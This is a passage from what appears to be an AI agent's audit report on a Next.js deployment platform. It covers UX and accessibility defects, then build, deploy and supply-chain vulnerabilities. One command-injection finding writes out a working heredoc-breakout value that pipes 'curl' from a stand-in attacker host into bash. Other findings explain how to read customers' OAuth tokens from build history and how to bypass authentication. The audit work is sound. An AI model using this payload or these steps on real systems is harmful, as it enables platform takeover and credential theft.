                console.error('Failed to fetch projects:', error);
            } finally {
                setLoading(false);
            }
        }

src/app/dashboard/page.tsx:273-276
            {/* Empty state - No projects at all */}
            {!loading && projects.length === 0 && (
                <OnboardingGuide />
            )}

src/components/OnboardingGuide.tsx:56 renders `Welcome to Deployify` with a 4-step "Connect GitHub / Import Project / Configure / Deploy" 
… (truncated)
```
- **Agent says it ruled out:** Grepped dashboard/page.tsx for `.ok`, `status ===`, and any error state — there is exactly one `.ok` reference in the file and none in fetchProjects; there is no `error` useState and no error branch in the render tree (lines 258-322 render only loading / OnboardingGuide / no-search-results / grid). Checked src/proxy.ts:176 — API paths get `NextResponse.json({ error: 'Unauthorized' }, { status: 401 })`, not a redirect, so an expired session reaches this code path as a parsable 401. Confirmed src/components/EmptyState.tsx has no error variant. Note the billing store (src/store/billing-slice.ts:64-69) does handle 401 and !ok correctly, so the codebase knows the pattern — the dashboard just omits it.

### 🟠 HIGH — currentProject is never cleared, so a failed project fetch renders the previous project's settings under the new project's URL and wires Save/Delete to the wrong project id
- **Location:** `src/store/project-slice.ts:159`
- **Category:** `stale-state-cross-resource-bleed`
- **Failure scenario:** A user is on /dashboard/A/settings, then navigates to /dashboard/B/settings. `/api/projects/B` returns 500 (or 403 after a role change, or times out). `projectResponse.ok` is false, so `currentProject` stays as project A; `isLoadingProject` flips false; the `!project` "Project Not Found" branch at line 105 is skipped because `project` is truthy. The page renders A's framework, build command, install command, root/output directory, webhook URL and toggles under B's URL. The user edits the build command believing they are editing B and clicks Save — `saveProjectSettings(project.id)` PATCHes /api/projects/A, silently overwriting project A's real build configuration, and toasts "Settings saved". Same class of bug on the project detail page (src/app/dashboard/[id]/page.tsx), where Redeploy/Rollback are bound to `project.id`.
- **Impact:** Silent cross-project configuration overwrite with a success toast. The user has no signal that the page is showing a different project than the URL, and the damage lands on a project they were not even looking at — the hardest kind of corruption to diagnose after the fact.
- **Evidence:**

```ts
src/store/project-slice.ts:159-206 — nothing resets `currentProject` when the fetch is not ok:
    fetchProjectDetails: async (projectId) => {
        const { currentProject } = get();
        if (!currentProject || currentProject.id !== projectId) {
            set({ isLoadingProject: true });
        }
        try {
            const [projectResponse, deploymentsResponse, statsResponse] = await Promise.all([...]);
            if (projectResponse.ok) {
                ...set({ currentProject: project, userRole: ..., buildCommand: ..., ... });
            }
        } catch (error) {
            console.error('Failed to fetch project details:', error);
        } finally {
            set({ isLoadingProject: false });
        }
    },

There is no reset anywhere: `setCurrentProject` is declared (src/store/project-slice.ts:43), defined (line 147: `setCurrentProject: (project) => set({ curre
… (truncated)
```
- **Agent says it ruled out:** Grepped for any reset: `rg 'currentProject: null|setCurrentProject|clearProject'` returns only the declaration/definition at src/store/project-slice.ts:43,111,147 — no caller. Checked the settings page's guard at src/app/dashboard/[id]/settings/page.tsx:105 (`if (!project)`) — it only fires when currentProject is null, i.e. on the very first load, never on a subsequent navigation. Checked that params.id is not compared against project.id anywhere in the page render. Confirmed the deployments/stats sub-fetches at lines 189-199 are correctly guarded on `.ok`, which shows the author guarded the inner responses but not the outer one.

### 🟠 HIGH — The Enterprise plan's "Contact Sales" button opens a live ₹15,000 Razorpay charge, and paying customers have no way to downgrade or cancel
- **Location:** `src/components/billing/PricingCard.tsx:79`
- **Category:** `billing-ux`
- **Failure scenario:** (a) A prospect on the Team plan clicks the Enterprise card's "Contact Sales" button expecting a lead form. `onUpgrade('enterprise')` fires, /api/billing/checkout mints a real Razorpay order for 1,500,000 paise, and a ₹15,000 payment sheet opens over the page. (b) A Team-plan customer who wants to downgrade to Pro sees a button labelled "Upgrade to Pro" — clicking it charges ₹1,500 for a lower tier with no proration notice and no confirmation. (c) A Pro customer who wants to cancel finds the Free card's button permanently `disabled` (`plan.id === 'free' && !isCurrent`), no "Cancel subscription" control anywhere on the page, and no API route that would serve one.
- **Impact:** An unintended ₹15,000 charge from a button whose label promises a conversation, and a recurring paid subscription with no self-serve exit. Beyond the immediate chargebacks and support load, a paid subscription with no in-product cancellation is a consumer-protection exposure in most of the markets this INR-priced product targets.
- **Evidence:**

```ts
src/components/billing/PricingCard.tsx:78-92 — the label says one thing, the handler does another, and the Free card is hard-disabled for anyone not already on Free:
                    <Button
                        onClick={() => onUpgrade(plan.id)}
                        disabled={isCurrent || (plan.id === 'free' && !isCurrent) || loading}
                        ...
                        {isCurrent
                            ? 'Current Plan'
                            : isEnterprise
                                ? 'Contact Sales'
                                : `Upgrade to ${plan.name}`}
                    </Button>

src/app/billing/page.tsx:100-135 — onUpgrade goes straight to checkout and opens the Razorpay modal:
    const handleUpgrade = async (tierId: string) => {
        if (tierId === 'free') return; // Free is default
        setUpgradingTierId(tierId);
        con
… (truncated)
```
- **Agent says it ruled out:** Read the full checkout route: the only tier rejection is `if (tier.id === 'free')` at line 57 — nothing special-cases enterprise, and the MOCK_DB branch at line 45 returns a mock order for it too. Grepped src/app/api/billing/** for 'cancel', 'downgrade', 'subscription' — no such route. Grepped src/components/billing/** and src/app/billing/page.tsx for any 'Cancel'/'Downgrade' control — none. Confirmed ComparePlansTable (src/app/billing/page.tsx:334) is display-only. Confirmed handleUpgrade has no `isEnterprise` branch.

### 🟠 HIGH — After a successful payment the billing page never refetches, so the customer's plan badge and quota gauges keep showing the tier they just paid to leave
- **Location:** `src/app/billing/page.tsx:148`
- **Category:** `post-mutation-desync`
- **Failure scenario:** A Free-plan user clicks "Upgrade to Pro", completes the ₹1,500 Razorpay payment, and /api/billing/verify returns 200. They see "Payment Successful & Verified! Upgrading your plan...". Then: the "Current Plan" badge still reads FREE, the Pro card still says "Upgrade to Pro" (and is still clickable — a second ₹1,500 charge is one click away), the Free card is still ring-highlighted as current, and the usage gauges still show 20 deployments / 100 build minutes / 5 GB. router.refresh() re-renders the RSC tree, but no server component supplies any of this — the zustand store is untouched. Nothing changes until the user does a full page reload.
- **Impact:** The moment immediately after taking a customer's money is the moment the product looks most broken. The user reasonably concludes the payment did not apply; the still-enabled "Upgrade to Pro" button invites a duplicate charge, and the alternative is a refund request. Also silently applies to the invoice table, which stays empty right after the purchase.
- **Evidence:**

```ts
src/app/billing/page.tsx:148-153 — the success path calls router.refresh() and nothing else:
                        const verifyData = await verifyRes.json();

                        if (verifyRes.ok) {
                            toast.success('Payment Successful & Verified! Upgrading your plan...');
                            setUpgradingTierId(null);
                            router.refresh();
                        } else {

Everything the page displays comes from client-only zustand state, which router.refresh() cannot touch — src/app/billing/page.tsx:1 is `'use client'`, and lines 210, 252, 316, 334:
    const { usage, limits, tier } = usageData;
    ...
                        <Badge variant="default" ...>{tier.name.toUpperCase()}</Badge>
    ...
                                currentPlanId={tier.id}
    ...
                    <ComparePlansTable plans={PLANS} currentPlanId
… (truncated)
```
- **Agent says it ruled out:** Read src/store/billing-slice.ts end to end (87 lines): `usageData` is written only in `fetchBillingData`; there is no subscription, poll, or webhook-driven update. Confirmed the page is a client component with no server-rendered billing data and no billing layout.tsx that could supply any (`ls src/app/billing/` shows only page.tsx). Confirmed the `useEffect` dep is the zustand action, which is referentially stable across renders. Confirmed the verify route exists and returns 200 on success, so this is the normal happy path, not an edge case.

### 🟠 HIGH — "Purge All Orphans" irreversibly deletes GCP databases chosen by a substring heuristic, behind a native confirm() that never names them, from a button styled identically to "Clear"
- **Location:** `src/components/StorageSection.tsx:688`
- **Category:** `destructive-action-affordance`
- **Failure scenario:** A customer runs infra discovery against their own GCP project, which also hosts a long-lived Cloud SQL instance they named `acme-pr-analytics` (or any name containing `-pr-` or `-branch-`). It does not match any active Deployify branch pattern, so discovery flags it `isOrphaned`. The header shows "3 ORPHANED" and offers a 20px-tall ghost button reading "Purge All Orphans" immediately to the left of an identically sized, identically styled "Clear" button that merely hides the list. One misclick, one native browser confirm that says only "PURGE ALL 3 orphaned resources" without naming a single one, and the loop issues DELETE for each — permanently destroying a production Postgres instance the user never registered with Deployify.
- **Impact:** The most destructive action in the product has the weakest confirmation in the product. Deleting a *project* gets a styled modal; permanently destroying N of the customer's real cloud databases — including ones Deployify does not own and only guessed at by filename — gets a browser alert that lists nothing and a button that looks like "Clear". The blast radius is the customer's entire GCP project and the loss is unrecoverable.
- **Evidence:**

```ts
src/components/StorageSection.tsx:688-714 — one native confirm, no list of what dies, then a bare deletion loop:
    const handlePurgeOrphans = async () => {
        const orphans = discoveredResources.filter(r => r.isOrphaned);
        if (orphans.length === 0) return;

        if (!confirm(`Are you sure you want to PURGE ALL ${orphans.length} orphaned resources? This action is irreversible.`)) return;
        ...
        for (const resource of orphans) {
            const res = await fetch(`/api/gcp/discover?projectId=${projectId}&resourceId=${resource.id}&resourceType=${resource.type}&region=${resource.region}...`, { method: 'DELETE' });

"Orphaned" is a filename guess over every Cloud SQL instance in the GCP project — src/lib/gcp/discovery.ts:92-93:
                    const isEphemeral = item.name.includes('-pr-') || item.name.includes('-branch-');
                    const isOrphan
… (truncated)
```
- **Agent says it ruled out:** Verified no stronger gate exists: grepped the repo for `confirmInput`, `=== project.name`, `type the name`, `to confirm` — zero hits, so there is no type-to-confirm anywhere. Confirmed the confirm() string is the only interstitial (no ConfirmationModal is used on this path, even though the same file uses ConfirmationModal 17 times). Confirmed the dialog does not enumerate the resources and the per-resource loop has no per-item confirmation. Read src/lib/gcp/discovery.ts:85-105 to confirm the heuristic scans the whole GCP project's Cloud SQL list, not a Deployify-owned subset.

### 🟠 HIGH — The entire product renders at 8px, including every page's <h1>, and status text uses colors at ~1.9:1 contrast
- **Location:** `src/app/dashboard/page.tsx:202`
- **Category:** `legibility-accessibility`
- **Failure scenario:** A customer opens /dashboard at 100% browser zoom on a 1440p display. The page title, the project names, the deployment status badges, the commit messages, the build/install command labels on the settings page, the pricing-card features, and the invoice table headers all render at 8 CSS pixels in bold uppercase with widened letter-spacing — roughly half the size of the browser's own UI chrome and below what most adults can read without leaning in. On the fleet-health card the count of degraded connectors is 8px #eab308 on #ffffff at 1.92:1, which is effectively invisible; a customer with three slow database connectors cannot see the number that tells them so.
- **Impact:** This is the first impression of every screen and it makes the product feel broken rather than dense. Practically, it blocks the WCAG 1.4.3 contrast criterion outright on the status system, so any enterprise or public-sector buyer running an accessibility review fails the product at the front door; and the 8px body copy pushes every user to permanent browser zoom, at which the fixed max-w-7xl layouts and 8px-tuned paddings were never tested.
- **Evidence:**

```ts
Every page heading is 8px on mobile, 10px on desktop — src/app/dashboard/page.tsx:202-204:
                        <h1 className="text-[8px] md:text-[10px] font-bold tracking-tight">
                            {activeTeam ? `${activeTeam.name} Projects` : 'Personal Projects'}
                        </h1>

That exact class string appears 50 times across src (`rg -n 'className="text-\[8px\] md:text-\[10px\] font-bold' src --glob '*.tsx' | wc -l` → 50), including "Welcome to Deployify" (src/components/OnboardingGuide.tsx:56), "Billing & Usage" (src/app/billing/page.tsx:238), and "Project Settings" (src/app/dashboard/[id]/settings/page.tsx:147).

Body copy is the same size: `rg -o 'text-\[8px\]' src --glob '*.tsx' | wc -l` → 1209 occurrences across 79 files; `text-[10px]` → 331. Nothing rescales them: src/app/globals.css defines no `html`/`:root` font-size and no zoom/transform — html/body
… (truncated)
```
- **Agent says it ruled out:** Checked for a global rescale that would make these sizes relative: grepped src/app/globals.css for `font-size`, `zoom`, `transform: scale`, `html {`, `:root` — the only font-size rules are 0.875rem/0.75rem on unrelated scoped selectors (lines 167, 235, 259, 374), never on html or body. Confirmed no tailwind.config.* exists (`ls tailwind.config*` → no matches), so no theme override reinterprets arbitrary values; globals.css:1 is `@import "tailwindcss"` (v4), where `text-[8px]` compiles to `font-size: 8px` literally. Computed both contrast ratios from the actual hex values in :root rather than estimating. Note the most recent commit is titled "refactor: final UI scale down", so this is the intended shipped state, not a work in progress.

### 🟡 MEDIUM — Account/project deletion has no type-to-confirm, and no modal in the app has dialog semantics, a focus trap, or an Escape handler
- **Location:** `src/components/ui/confirmation-modal.tsx:39`
- **Category:** `destructive-confirmation-and-modal-a11y`
- **Failure scenario:** (a) A user opens the account Danger Zone, clicks "Delete Account", and the modal's "Delete Account" button lands under the cursor two clicks after the trigger with no typed confirmation — a double-click or a mis-aimed second click permanently destroys every project, deployment and env var on the account. (b) A keyboard user opens the same modal: focus stays on the now-hidden trigger button behind the overlay, Tab walks through the entire page underneath before ever reaching Cancel/Confirm, Escape does nothing (only src/components/CommandPalette.tsx and GlobalShortcuts.tsx bind Escape — the modal does not), and clicking the backdrop does nothing either, so there is no way to dismiss the dialog except finding and activating Cancel. (c) A screen-reader user gets no announcement that a dialog opened at all, since the container is an unlabelled div.
- **Impact:** The delete-account and delete-project flows sit one stray click from irreversible loss with less friction than every peer platform, which all require typing the resource name. Separately, the total absence of dialog semantics means keyboard and assistive-technology users cannot reliably operate — or escape — any of the 20+ modals, including the ones that drop databases and restore backups over live data; that is a WCAG 2.1 keyboard/no-keyboard-trap and name-role-value failure across the product's entire confirmation layer.
- **Evidence:**

```ts
The single shared modal used for every destructive confirmation is a plain div — no role, no aria-modal, no aria-labelledby, no Escape listener, no focus management, and no backdrop-click handler (src/components/ui/confirmation-modal.tsx:39-46):
  if (!isOpen) return null;

  return (
    <Portal>
      <div className="fixed inset-0 z-[100] flex items-center justify-center bg-background/80 backdrop-blur-sm p-4 animate-fade-in">
        <div className="bg-[var(--card)] border border-[var(--border)] w-full max-w-md rounded-xl shadow-2xl flex flex-col overflow-hidden animate-fade-in">

`rg 'role="dialog"|aria-modal|useFocusTrap|focus-trap' src --glob '*.tsx'` returns zero matches repo-wide, across 20+ ConfirmationModal call sites (17 in StorageSection.tsx alone, plus EnvVariablesSection, CronsSection, DomainsSection, IaCExportModal, OptimizationModal, and both settings pages). src/component
… (truncated)
```
- **Agent says it ruled out:** Grepped repo-wide for the mitigations before reporting: `role="dialog"`, `aria-modal`, `useFocusTrap`, `focus-trap` → 0 hits; `'Escape'|"Escape"` → 6 hits, none in confirmation-modal.tsx or portal.tsx (they are in CommandPalette, GlobalShortcuts, query-editor, LandingPage, and the dashboard search input). Confirmed no headless-UI/Radix Dialog dependency is used for these (the modal is hand-rolled over src/components/ui/portal.tsx, which only does createPortal). Confirmed no type-to-confirm helper exists under src/components/ui/. Verified the ConfirmationModal props interface (lines 8-22) has no field that would enable a typed confirmation, so no call site can opt in.

> **Coverage notes (D11):** Swept and read end-to-end: src/app/dashboard/page.tsx, dashboard/[id]/page.tsx, dashboard/[id]/settings/page.tsx, dashboard/settings/page.tsx, dashboard/new/page.tsx, dashboard/new/import/page.tsx, dashboard/[id]/analytics/page.tsx (partial), src/app/new/page.tsx, src/app/billing/page.tsx, src/app/share/dashboard/[id]/page.tsx, src/components/{ProjectCard,EmptyState,OnboardingGuide,RegionSettings,StorageSection(destructive paths),DataLab(mutation paths),EnvVariablesSection,LogViewer,ui/confirmation-modal,ui/portal,billing/PricingCard}.tsx, src/store/{project-slice,billing-slice}.ts, src/lib/billing/tiers.ts, src/lib/gcp/discovery.ts, and the API routes backing each claim (api/projects, api/projects/[id]/deploy, api/repos, api/billing/checkout, api/projects/[id]/storage/[storageId]/query).

Systematic sweeps run: (1) all `await X.json()` with no `.ok`/status check within 8 lines of context — 37 sites, concentrated in DataLab (13), StorageSection (12), dashboard/page.tsx (2), share/dashboard (2); (2) all `<Button size="icon">` parsed across multi-line attributes — 67 total, 26 with no accessible name (aria-label, title, or text child), e.g. src/components/RollbackModal.tsx:35, DeploymentLogsModal.tsx:86, CreateTeamModal.tsx:73, ui/confirmation-modal.tsx:67; (3) TODO/FIXME/mock/lorem/"coming soon" — only two hits, src/components/ProjectCard.tsx:12 and src/components/LandingPage.tsx:187; (4) confirm()/DELETE/restore destructive paths; (5) `text-[Npx]` arbitrary font sizes; (6) role=dialog/aria-modal/focus-trap/Escape.

Three verified issues I ranked just below the top 8, in case they are useful:
- src/components/ProjectCard.tsx:12-32,77-91 — every project card on the main dashboard renders a recharts LineChart fed by `Math.random()` ("// Mock data for the sparkline"), colored by deployment status and positioned exactly where a traffic sparkline belongs. Fabricated data on the product's primary surface. Only Math.random() in the whole UI.
- src/app/share/dashboard/[id]/page.tsx:74-96,121-135 — the public shared-dashboard page sets `error` on any query failure and never clears it on success, and the error branch renders a terminal full-page "Access Denied … may be private, deleted" screen with no retry. One transient DB timeout on the auto-refresh tick (line 106) permanently replaces a working public chart with an access-denied page until the viewer reloads.
- src/app/api/repos/route.ts:18-21 + src/lib/github.ts:63-69 — repo listing is a single un-paginated page (per_page 100, GitHub's max) with client-side-only filtering; a user with >100 repos cannot import repo #101, and src/app/new/page.tsx:352-358 tells them "No repositories found matching your search" with no "can't find your repo?" affordance. The same page also swallows a `data.error` into a toast (lines 213-214) while leaving that misleading empty state underneath.

Could NOT cover: no runtime/browser verification (findings are static-analysis only, though every code path was read to its terminus); did not audit src/components/ui/** primitives (button, input, badge, skeleton) beyond confirmation-modal and portal; did not read DataLab.tsx or StorageSection.tsx exhaustively (2,997 and 3,981 lines — I read their fetch/mutation/destructive paths and modal call sites, not their full render trees); did not review src/(marketing)/** LandingPage or login page in depth; did not evaluate mobile breakpoints empirically (noted only that globals.css:115-119 sets `overflow-x: hidden` on html and body, which masks rather than fixes horizontal overflow); did not review src/components/analytics/** or WebVitals.

One dead-code observation, not reported as a finding because no user can reach it: /dashboard/new and /dashboard/new/import (~860 lines, a complete second project-import flow that duplicates /new with a different feature set) are linked from nothing — the only inbound links are from each other (src/app/dashboard/new/import/page.tsx:69,181). Every real entry point (dashboard/page.tsx:245, OnboardingGuide.tsx:108, GlobalShortcuts.tsx:46) goes to /new.

Rejected during verification: DataLab executing destructive SQL (server enforces a read-only allowlist at src/app/api/projects/[id]/storage/[storageId]/query/route.ts:141-170); RegionSettings saving on select-change without confirmation (reversible, and an explicit "Deployment Required" notice is shown at lines 135-146); native confirm() being suppressible (Chrome's suppression makes confirm() return false, which fails safe here).


## D12. Build, deploy, config & supply chain  <sub>`ops-config-supply`</sub>

### 🔴 CRITICAL — Unvalidated `rootDirectory` bypasses its own sanitizer and breaks out of the Cloud Build heredoc, giving any signed-up user shell in the platform's Cloud Build step
- **Location:** `src/lib/gcp/cloudbuild.ts:192`
- **Category:** `command-injection`
- **Failure scenario:** Any self-signup user creates a project (POST /api/projects, src/app/api/projects/route.ts:75 destructures `rootDirectory = ''` from the body with zero validation — `grep -n "test(|/^" src/app/api/projects/route.ts` returns nothing), or PATCHes an existing one (src/app/api/projects/[id]/route.ts:132 lists 'rootDirectory' in allowedFields and applies no content check). They set rootDirectory to the multi-line value:
    app\nEOFMARKER\ncurl -sL http://attacker.tld/x.sh | bash\n: <<'EOFMARKER'
Then they click Deploy (src/app/api/projects/[id]/deploy/route.ts:197 forwards `rootDirectory: project.rootDirectory`). The generated Dockerfile text now contains a line that is exactly `EOFMARKER`, terminating the heredoc at cloudbuild.ts:232 early. Everything after it is no longer Dockerfile content — it is parsed as bash by the `gcr.io/cloud-builders/docker` step, so `curl … | bash` runs directly on the Cloud Build worker, outside any `docker build` container.
- **Impact:** Escape from 'my build code runs in a sandboxed docker build layer' to 'arbitrary shell in the platform's Cloud Build step', which has the Docker daemon socket and the GCE metadata server for the platform's shared Cloud Build service account. That service account demonstrably holds project-level IAM-binding rights (cloudbuild.ts:335-342 calls `gcloud projects add-iam-policy-binding` and `gcloud secrets add-iam-policy-binding` on the platform project), so the attacker can mint themselves Owner, read every tenant's Secret Manager secrets, and pull/poison every other customer's images in Artifact Registry. Full multi-tenant GCP project takeover from an ordinary user account.
- **Evidence:**

```ts
cloudbuild.ts:76-82 builds a sanitizer:
    // Validate rootDirectory to prevent command injection
    let safeRootDirectory = '';
    if (rootDirectory && /^[a-zA-Z0-9_\-./]+$/.test(rootDirectory) && !rootDirectory.includes('..')) {
        safeRootDirectory = rootDirectory.replace(/^\/+|\/+$/g, ''); // Trim slashes
    } else if (rootDirectory) {
        console.warn(`Invalid rootDirectory provided: "${rootDirectory}". Defaulting to root.`);
    }

...but cloudbuild.ts:185-193 passes the RAW value, not `safeRootDirectory`:
        dockerfileContent = getDockerfile({
            framework,
            buildEnvSection,
            outputDirectory,
            buildCommand,
            installCommand,
            restoreCache: !force,
            rootDirectory,          // <-- line 192, unsanitized
        });

src/lib/dockerfiles.ts:321-322 and :355 interpolate it into a RUN line:
    co
… (truncated)
```
- **Agent says it ruled out:** Grepped the full chain: POST /api/projects and PATCH /api/projects/[id] both call getSession()/checkProjectAccess but neither applies any regex or character filter to rootDirectory. Confirmed `escapeBashArg` (cloudbuild.ts:211) is applied to imageName and dockerBuildArgs at lines 289-293 and 316-320 but is NOT applied to `dockerfileContent` at line 233. Confirmed `safeRootDirectory` is used only for `workDir` (line 86) and never reaches getDockerfile. Read src/lib/dockerfiles.test.ts — it only tests benign values ('web', 'docs', 'api'), so no test covers this.

### 🟠 HIGH — User's GitHub OAuth access token is embedded verbatim in the Cloud Build step arguments and persisted in build history
- **Location:** `src/lib/gcp/cloudbuild.ts:505`
- **Category:** `secret-exposure`
- **Failure scenario:** A user deploys any project. Their GitHub OAuth access token (scoped to their repos) is written into the `steps[0].args` of the Build resource stored by Cloud Build in the shared platform GCP project. Any principal holding `cloudbuild.builds.get`/`roles/cloudbuild.builds.viewer` — every platform engineer, every CI robot, and anyone who obtains such a role, including via the injection in finding #1 — can run `gcloud builds list` then `gcloud builds describe <id>` and read the plaintext OAuth tokens of every customer who has ever deployed. Cloud Build retains build records long after the deploy completes, so revoking access later does not scrub them.
- **Impact:** Cross-tenant credential theft: harvested GitHub OAuth tokens grant read/write access to each victim's private GitHub repositories, entirely outside Deployify. Secondarily, `repoFullName` and `commitSha` are interpolated into the same unquoted `bash -c` string with no escaping (contrast the deliberate `escapeBashArg` used at lines 289-293), so any path that lets those fields carry shell metacharacters is a second command-injection sink in the same line.
- **Evidence:**

```ts
if (gitToken) {
        return {
            steps: [
                // Step 0: Clone repository using token
                {
                    name: 'gcr.io/cloud-builders/git',
                    entrypoint: 'bash',
                    args: [
                        '-c',
                        `git clone https://x-access-token:${gitToken}@github.com/${repoFullName} . && git checkout ${commitSha}`,
                    ],
                },

The token is the live user session token — src/app/api/projects/[id]/deploy/route.ts:188:
                    gitToken: session?.accessToken ?? projectGitToken ?? undefined,

This object is POSTed as-is to the Cloud Build API (cloudbuild.ts:561-570):
        `${CLOUD_BUILD_API}/projects/${gcpProjectId}/locations/${region}/builds`,
        { method: 'POST', ..., body: JSON.stringify(buildConfig) }
```
- **Agent says it ruled out:** Checked whether Cloud Build's secret facility is used: grepped cloudbuild.ts for `availableSecrets` and `secretEnv` — neither appears anywhere in the file; the only Secret Manager usage is `--set-secrets` for the deployed Cloud Run service (line 388), not for the build itself. Confirmed the token is not redacted before submission — `submitCloudBuild` (line 544) JSON-stringifies the config unchanged. Confirmed `escapeBashArg` exists at line 211 but is not applied to this step.

### 🟠 HIGH — No .dockerignore: `COPY . .` bakes live production secrets and the host's node_modules into the platform image build
- **Location:** `Dockerfile:13`
- **Category:** `supply-chain`
- **Failure scenario:** Two concrete failures from the same line. (1) Secrets: a developer or CI runs `docker build .` in a checkout. With no .dockerignore the build context includes `.env.local` and the full `.git` directory, and `COPY . .` writes both into the `builder` layer. Anyone who obtains that layer — via `docker build --target builder`, `docker save`, a BuildKit `--cache-to` registry export, or the `-builder` tagged images this codebase itself creates (src/lib/gcp/cloudbuild.ts:316-322 runs `docker build --target builder -t ${imageName}-builder`) — recovers JWT_SECRET, which is the HS256 signing key for every `deployify_session` cookie (src/lib/auth.ts:10 `new TextEncoder().encode(config.jwt.secret)`) AND, via src/lib/config.ts:60 `encryptionKey: process.env.ENCRYPTION_KEY || process.env.JWT_SECRET`, the AES-256-GCM key for every stored customer database credential. (2) Correctness: line 12 installs a linux/alpine `node_modules` from the `deps` stage, then line 13 immediately overlays it with whatever `node_modules` the host had — 640 entries on this macOS checkout. Native `.node` binaries built for darwin-arm64 replace the alpine ones, and `npm ci`'s pinned tree at line 8 is silently discarded.
- **Impact:** Full session forgery and decryption of all stored tenant DB credentials if any builder layer or build cache ever escapes; plus non-reproducible, silently-corrupted images whose dependency tree is the build machine's rather than the lockfile's.
- **Evidence:**

```ts
Dockerfile:10-18:
FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .

ENV NEXT_TELEMETRY_DISABLED=1
ENV NODE_ENV=production

RUN npm run build

`ls -la` at repo root confirms there is no .dockerignore (the file does not exist), while `.env.local` (3505 bytes) does and holds live values for: GITHUB_CLIENT_SECRET, GITHUB_WEBHOOK_SECRET, FIREBASE_PRIVATE_KEY, JWT_SECRET, RAZORPAY_KEY_SECRET.
```
- **Agent says it ruled out:** Verified `.dockerignore` is absent at the repo root (and nowhere else: it does not appear in `git ls-files`). Verified `.env.local` is correctly gitignored (.gitignore:37 `.env*`) — so this is a Docker-context leak, not a git leak. Confirmed the final `runner` stage copies only `public`, `.next/standalone` and `.next/static` (Dockerfile:29-34) and that `.next/standalone` contains no `.env*` file locally, so the *final* image is clean — the exposure is the builder layer, the build cache, and the uploaded context.

### 🟠 HIGH — Next.js is pinned below the fixes for multiple Middleware/Proxy-bypass advisories, and src/proxy.ts is the sole edge auth gate
- **Location:** `package.json:42`
- **Category:** `vulnerable-dependency`
- **Failure scenario:** An unauthenticated attacker requests a `/dashboard/...` path using one of the published segment-prefetch or dynamic-route-parameter forms covered by GHSA advisories fixed in 16.2.5/16.2.6. Because the running Next.js is 16.2.3 and the manifest floor `^16.2.4` still resolves below every fix, `proxy()` is not invoked for that request, so the cookie check at line 156 never runs and the dashboard route renders without a session. Separately, `subdomain` at line 87/90 is derived purely from the client-supplied `Host` header and fed into `NextResponse.rewrite`, which is precisely the shape of the rewrite-SSRF advisory fixed in 16.2.11.
- **Impact:** Unauthenticated reach into authenticated dashboard routes and SSRF from the platform's own edge. Also reachable in the same prod tree, from the same audit: mysql2 (high, 'Auth Plugin Downgrade to mysql_clear_password Leaks Plaintext Credentials' — directly relevant since src/lib connectors dial user-owned MySQL over the network), axios (high, multiple NO_PROXY/SSRF bypasses), and js-yaml (high, quadratic-complexity DoS). Prod-only totals: 55 vulnerabilities (4 critical, 22 high, 28 moderate, 1 low).
- **Evidence:**

```ts
package.json:42:
    "next": "^16.2.4",

Installed: 16.2.3 (node_modules/next/package.json); package-lock.json pins 16.2.4.

`npm audit --omit=dev` reports, for the `next` package specifically:
  high | >=16.0.0 <16.2.6  | Next.js has a Middleware / Proxy bypass in App Router applications via segment-prefetch routes - Incomplete Fix Follow-Up
  high | >=16.0.0 <16.2.5  | Next.js has a Middleware / Proxy bypass through dynamic route parameter injection
  high | >=16.0.0 <16.2.11 | Next.js: Server-Side Request Forgery in rewrites via attacker-controlled destination hostname
  moderate | >=16.0.0 <16.2.11 | Next.js: Unauthenticated disclosure of internal Server Function endpoints

src/proxy.ts:155-173 is the only edge gate on the dashboard:
        if (pathname.startsWith('/dashboard') || pathname.startsWith('/new')) {
            const sessionCookie = request.cookies.get('deployify_session
… (truncated)
```
- **Agent says it ruled out:** Read src/proxy.ts end-to-end to confirm it is the enforcement point rather than decorative — lines 155-178 are the only cookie check before dashboard rendering, and the exported `config.matcher` at line 212 (`'/((?!favicon.ico|public/).*)'`) confirms it is meant to cover those paths. Verified the advisory ranges against the installed version programmatically rather than trusting the summary. Confirmed `npm audit --omit=dev` (production tree) rather than the dev tree.

### 🟠 HIGH — `MOCK_DB=true` disables the dashboard authentication gate in any NODE_ENV, including production
- **Location:** `src/proxy.ts:165`
- **Category:** `insecure-configuration`
- **Failure scenario:** `MOCK_DB=true` is set in the Cloud Run service's environment — plausible because the same variable is threaded through ~20 production API handlers as a live runtime branch, not a test-only shim (e.g. src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:146, src/app/api/projects/[id]/storage/[storageId]/branch/route.ts:127/186/252/328, .../queries/route.ts:27, .../audit/route.ts:33, .../metrics/route.ts:29). With that single variable present, `proxy()` returns the response unchanged for every `/dashboard/*` and `/new` request, so an attacker with no cookie at all reaches the dashboard shell and every RSC payload it triggers. It also silently rewires those storage endpoints onto mock branches in production.
- **Impact:** One misplaced environment variable in the Cloud Run service config converts the platform from authenticated to open, with no error, no log line, and no startup validation to catch it. The variable is not listed in env.example, so nothing documents that setting it is catastrophic.
- **Evidence:**

```ts
src/proxy.ts:154-167:
        // Check authentication for protected dashboard routes
        if (pathname.startsWith('/dashboard') || pathname.startsWith('/new')) {
            const sessionCookie = request.cookies.get('deployify_session');
            const token = sessionCookie ? decodeURIComponent(sessionCookie.value) : '';

            // Allow logout to work in dev
            if (process.env.NODE_ENV === 'development' && token === 'deleted') {
                return NextResponse.redirect(new URL('/login', request.url));
            }

            // Bypass for local development
            if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') {
                return response;
            }

Note the asymmetry: the `token === 'deleted'` escape hatch two lines above IS conjoined with `NODE_ENV === 'development'`; the MOCK_DB branch is a separate disjunct with
… (truncated)
```
- **Agent says it ruled out:** Grepped env.example and .github/workflows for MOCK_DB — zero hits, so it is not deliberately set in the shipped config today; the finding is that nothing prevents or detects it. Checked src/lib/config.ts:88-113 `validateConfig()` — it validates only GITHUB_CLIENT_ID/SECRET, GITHUB_WEBHOOK_SECRET, GCP_PROJECT_ID, JWT_SECRET, it never inspects MOCK_DB, and it only `console.warn`s (never throws), and its single caller is src/app/layout.tsx:10, which does not execute for API routes at all.

### 🟡 MEDIUM — No CI job runs the test suite or the linter; the only quality gate is a build step behind an author-name substring match, and the merge cron bypasses branch protection
- **Location:** `.github/workflows/auto-merge-jules.yml:15`
- **Category:** `ci-supply-chain`
